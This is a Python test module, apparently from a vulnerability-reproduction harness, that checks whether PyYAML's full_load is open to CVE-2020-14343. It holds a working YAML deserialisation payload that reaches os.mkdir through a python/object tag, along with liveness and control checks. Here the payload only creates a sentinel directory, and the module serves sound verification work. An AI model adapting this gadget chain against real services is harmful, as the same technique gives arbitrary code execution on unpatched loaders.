"""CVE-2020-14343 -- PyYAML full_load constructs arbitrary types (5.3.1 -> 5.4).

Oracle, declared before execution: a directory that the probe never creates
itself exists on disk once ``full_load`` has returned. The deserialiser made it,
by reaching ``os.mkdir`` through a tag the allowlist was supposed to refuse.

That is a side effect in the target, not a substring of the document, which is
what rule C5 requires: an oracle that matched text from the YAML the probe wrote
would be the catalogued FP#4 shape.
"""

from __future__ import annotations

import os
from pathlib import Path

from ._support import pinned_version

DIST = "PyYAML"
MODULE = "yaml"

#: The document carries a flow mapping, so ``str.format`` is NOT usable here:
#: its braces are the YAML, not a placeholder. Substitution is by replace().
_DOC = """!!python/object/new:type
  args: ["evil", !!python/tuple [], {"extend": !!python/name:os.mkdir }]
  listitems: "__SENTINEL_PATH__"
"""


def _attempt(ctx: dict, name: str) -> tuple[bool, str]:
    import yaml

    sentinel = Path(ctx["workdir"]) / name
    doc = _DOC.replace("__SENTINEL_PATH__", str(sentinel).replace("\\", "\\\\"))
    note = ""
    try:
        yaml.full_load(doc)
    except Exception as exc:  # the refusal path on a patched version
        note = f"{type(exc).__name__}"
    created = sentinel.is_dir()
    return created, f"sentinel_created={created} loader_note={note or 'none'}"


def liveness(ctx: dict) -> tuple[bool, str]:
    """full_load must parse an ordinary document, and the pin must be the pin."""
    origin = pinned_version(DIST, MODULE, ctx["version"], ctx["pin_dir"])
    import yaml

    value = yaml.full_load("a: 1\nb: [2, 3]\n")
    ok = value == {"a": 1, "b": [2, 3]}
    return ok, f"benign full_load -> {value!r} from {os.path.basename(origin)}"


def control(ctx: dict) -> tuple[bool, str]:
    """The same oracle on a document with no object tag. Must NOT fire."""
    import yaml

    sentinel = Path(ctx["workdir"]) / "control-sentinel"
    yaml.full_load(f"path: {sentinel}\n")
    created = sentinel.is_dir()
    return created, f"benign document, sentinel_created={created}"


def exploit(ctx: dict) -> tuple[bool, str]:
    return _attempt(ctx, "exploit-sentinel")
